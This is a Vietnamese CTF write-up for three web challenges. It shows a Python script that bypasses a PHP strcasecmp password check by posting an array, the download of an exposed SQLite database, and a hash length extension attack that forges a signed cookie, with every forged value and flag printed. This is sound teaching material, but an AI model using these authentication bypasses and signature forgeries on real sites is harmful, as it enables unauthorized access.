## Bài 2:
* Đọc mã nguồn của trang 
``` html
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
<?php
$password = 'FLAG_????????????????';
if (isset($_POST['password']))
    if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
?>
    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```
* Ta thấy 
```php
if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
```

* Với hàm `strcasecmp` ta chỉ cần truyền vào 1 mảng password là có thể vượt qua được.
* Viết 1 chương trình sử dụng `Python` để gửi 1 mảng password vào form
```python
import urllib
import urllib2

url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'
data = {"password[]": "pass ne",}
a = urllib.urlencode(data).encode("utf-8")
print a 
req = urllib2.Request(url, a)
res = urllib2.urlopen(req)
html = res.read()
print html
```
* Ta thu được flag: `FLAG_VQcTWEK7zZYzvLhX`

## Bài 4:
* Xem mã nguồn ta thấy trang web sử dụng database của SQLite
* Đối với SQLite, DBMS này không có cơ chế xác thực bằng Username và Password mà chỉ đơn giản là đường dẫn tới file dữ liệu
* Đọc trong mã nguồn ta thấy 
`$db = new PDO('sqlite:database.db');`
Vậy đường dẫn đến file database sẽ là 
`http://ctfq.sweetduet.info:10080/~q35/database.db`
* Tải file database rồi Select đến bảng user ta sẽ được

| id        | Password              |
| ----------|:---------------------:|
| root      | FLAG_iySDmApNegJvwmxN |

*Vậy cờ thu được là `FLAG_iySDmApNegJvwmxN`

## Bài 3:
* Đọc mã nguồn ta thấy 
```
$shipname = array(
    'Nagato',
    'Mutsu',
    'Kongo',
    'Hiei',
    'Haruna',
    'Kirishima',
    'Fuso',
    'Yamashiro',
    'Ise',
    'Hyuga',
    "Yamato [Congratulations! The flag is $salt. ??????????????????????????????????????.]"
);
```
* Mảng shipname có 11 phần tử, nhưng ta đọc tiếp đoạn code bên dưới thấy 
`        $ship[] = mt_rand(0, count($shipname)-2);` 
`    echo "<li>{$shipname[$ship[$i]]}</li>\n";`
* Khi ta bấm nút Gacha thì xuất hiện ngẫu nhiên các phần tử trong mảng `shipname`, nhưng hàm `mt_rand` chỉ cho phép xuất hiện đến phần tử thứ 10, phần tử thứ 11 là flag
* Thử kiểm tra cookie với 2 trọng số chính là `ship` và `signature` thấy cặp `{ship:signature}` không đổi.
* Nghĩ cách set cookie với giá trị `ship` chứa số 10 và `signature` đúng thì sẽ hiển thị được flag
* Sử dụng hàm `hashpump` với các giá trị sau
- `Input Signature: 489009674f199404993dffeba9dfb5d138414173104d9c1f0d69ab147211f513d07a7020d1c1eda22808efe5a6dc3c7c26bab25ea6813021ddffe8c7d636944d
` (Lấy trên cookie trình duyệt)
- `Input Data: 9`
- `Input Key Length: 21` (Mã nguồn `$salt = 'FLAG_????????????????';` thấy có 21 kí tự =)))
- `Input Data to Add: ,10`
* Nhận được `930472e5483c2f10a18f8a2873d50850809f6f90a88b98f453a67ee896a69c86d4bfac8877f8ae63d48ab5acb7079d389588f6675495ae83c956a95788ab0d9c` là `signature` mới 
`9\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0,10` là `ship` mới
* Sửa giá trị `ship` mới bằng cách bỏ `\x` và thay bằng `%` ta được chuỗi mới `# 9%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b0,10`
* Set lại cookie bằng 2 giá trị mới ta sẽ thu được cờ
`FLAG_uc8qVFa8Sr6DwYVP`